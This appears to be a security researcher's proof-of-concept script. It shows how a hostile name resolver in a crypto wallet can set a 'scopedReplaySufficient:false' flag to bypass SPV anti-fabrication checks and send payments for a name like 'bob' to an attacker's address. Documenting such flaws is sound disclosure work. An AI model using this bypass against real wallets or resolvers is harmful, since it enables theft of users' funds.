// NAME-5 PoC — the scopedReplaySufficient:false ESCAPE HATCH.
// Claim: a hostile/MITM PRIMARY resolver can DEFEAT the SPV anti-fabrication verifier for ANY clean
// (non-fill) name by simply flagging scopedReplaySufficient:false. The wallet then DISCARDS its own
// SPV-proven address and falls back to the UNTRUSTED resolver addr (wallet.resolveName base.addr).
import { verifyNameUnion } from "../src/core/namespv.ts";
import { buildNameClaim, buildNameSet, TREASURY_ADDR } from "../src/core/cairnx.ts";
import { signSighash, buildScriptSig, addrFromPriv } from "../src/core/csdtx.ts";
import { txid as ctxid, sighash as vSighash, merkleRoot, rpcTxToTx } from "../src/vendor/cairnx-spv.js";

const CAIRNX_DOMAIN = "cairnx:v1";
const REG_FEE = 1000_000_000;
const keyHonest = "0x"+"11".repeat(32);
const HONEST_OWNER = addrFromPriv(keyHonest).toLowerCase();
const HONEST_ADDR = "0x"+"cd".repeat(20);   // the address the real owner nset to (the legit recipient)
const ATTACKER    = "0x"+"ee".repeat(20);   // the address the hostile primary wants funds to go to
const PREVOUTS = new Map(); let seq=0;
const pick = b => ({uri:b.uri,payloadHash:b.payloadHash});
function proposeTx({uri,payloadHash,priv,outputs=[]}){
  const prevTxid="0x"+(++seq).toString(16).padStart(64,"0");
  PREVOUTS.set(prevTxid.toLowerCase(), addrFromPriv(priv).toLowerCase());
  const tx={version:1,locktime:0,inputs:[{prevTxid,vout:0,scriptSig:"0x"}],
    outputs:outputs.map(o=>({value:o.value,scriptPubkey:o.to})),
    app:{type:"Propose",domain:CAIRNX_DOMAIN,payloadHash,uri,expiresEpoch:9999999}};
  const {sig64,pub33}=signSighash(vSighash(tx),priv); tx.inputs[0].scriptSig=buildScriptSig(sig64,pub33);
  return {version:1,locktime:0,inputs:[{prev_txid:tx.inputs[0].prevTxid,vout:0,script_sig:tx.inputs[0].scriptSig}],
    outputs:outputs.map(o=>({value:o.value,script_pubkey:o.to})),
    app:{type:"Propose",domain:CAIRNX_DOMAIN,payload_hash:payloadHash,uri,expires_epoch:9999999}};
}
const feeOut=(v=REG_FEE)=>[{to:TREASURY_ADDR,value:v}];
function world(p){const blocks=new Map(),hints=[];for(const{height,tx}of p){const a=blocks.get(height)??blocks.set(height,[]).get(height);const pos=a.length;a.push(tx);hints.push({txid:ctxid(rpcTxToTx(tx)),height,pos,kind:"name"});}return{blocks,hints};}
function source(blocks,tip){return{
  async prepare(){return{verifiedTip:tip,nodeTip:tip};},
  async blockAt(h){const txs=blocks.get(h);if(!txs)throw new Error("no header "+h);return{merkle:merkleRoot(txs.map(t=>ctxid(rpcTxToTx(t)))),txs};},
  async prevoutScriptPubkey(p){return PREVOUTS.get(String(p).toLowerCase())??null;}};}
function mkFetch(byBase){return async(url)=>{const base=Object.keys(byBase).find(b=>String(url).startsWith(b));const spec=base?byBase[base]:undefined;
  if(!spec) return {status:0,ok:false,async json(){return{}}};
  return {status:200,ok:true,async json(){return spec;}};};}

// World: the HONEST owner registered `bob` and nset it to HONEST_ADDR. Plain, non-fill, fully scope-provable.
const NAME="bob";
const reg  = proposeTx({...pick(buildNameClaim({name:NAME})),priv:keyHonest,outputs:feeOut()});
const nset = proposeTx({...pick(buildNameSet({name:NAME,addr:HONEST_ADDR})),priv:keyHonest});
const {blocks,hints}=world([{height:33700,tx:reg},{height:33710,tx:nset}]);

const PRIM="https://cairn-substrate.com/trade/api";
const CLAR="https://clarvis.cairn-substrate.com/trade/api";
const sources=[{label:"primary",base:PRIM},{label:"clarvis",base:CLAR}];

// BASELINE: both sources honest → strong verified to HONEST_ADDR.
{
  const honest={ok:true,events:hints,resolve:{addr:HONEST_ADDR,owner:HONEST_OWNER,via:"nset"},scopedReplaySufficient:true};
  const r=await verifyNameUnion(NAME,sources,source(blocks,33800),mkFetch({[PRIM]:honest,[CLAR]:honest}));
  console.log("[BASELINE both honest]   verified=%s addr=%s sources=%s disagree=%s",r.verified,r.addr,r.sources,r.disagree);
}

// FABRICATION (control case): hostile primary serves a FAKE resolve.addr=ATTACKER but TRUE events +
// scopedReplaySufficient:true. The union catches it → routes to the SPV-proven HONEST_ADDR with disagree.
{
  const evilClaimAddr={ok:true,events:hints,resolve:{addr:ATTACKER,owner:HONEST_OWNER,via:"nset"},scopedReplaySufficient:true};
  const honest      ={ok:true,events:hints,resolve:{addr:HONEST_ADDR,owner:HONEST_OWNER,via:"nset"},scopedReplaySufficient:true};
  const r=await verifyNameUnion(NAME,sources,source(blocks,33800),mkFetch({[PRIM]:evilClaimAddr,[CLAR]:honest}));
  console.log("[FAB primary, no SRS]    verified=%s addr=%s disagree=%s  (anti-fabrication routes to PROVEN addr)",r.verified,r.addr,r.disagree);
}

// *** ATTACK: hostile primary serves resolve.addr=ATTACKER AND flags scopedReplaySufficient:false. ***
// The escape hatch fires (servedInsufficient) BEFORE the addr cross-check → verifyNameUnion fails CLOSED.
// rep.addr (the SPV-proven HONEST_ADDR) is DISCARDED. viaFill:false (self-computed: this is a clean name).
{
  const evilSRS={ok:true,events:hints,resolve:{addr:ATTACKER,owner:HONEST_OWNER,via:"nset"},scopedReplaySufficient:false};
  const honest ={ok:true,events:hints,resolve:{addr:HONEST_ADDR,owner:HONEST_OWNER,via:"nset"},scopedReplaySufficient:true};
  const r=await verifyNameUnion(NAME,sources,source(blocks,33800),mkFetch({[PRIM]:evilSRS,[CLAR]:honest}));
  console.log("[ATTACK primary SRS:false] verified=%s viaFill=%s reason=%j",r.verified,r.viaFill,r.reason);
  // Now model wallet.resolveName's fallback: it returns base.addr (the UNTRUSTED primary /cairnx/resolve addr).
  const baseAddrFromHostilePrimary = ATTACKER; // = j.addr from this.tradeApi /cairnx/resolve
  const verified = r.verified===true && !!r.addr;
  const sentTo = verified ? r.addr : baseAddrFromHostilePrimary;
  console.log("    -> wallet.resolveName returns verified=%s, send target=%s", verified, sentTo);
  console.log("    -> MISROUTE: %s (SPV-proven addr was %s but discarded; popup shows a generic caution badge)",
    sentTo===ATTACKER ? "FUNDS ROUTED TO ATTACKER" : "ok", HONEST_ADDR);
}
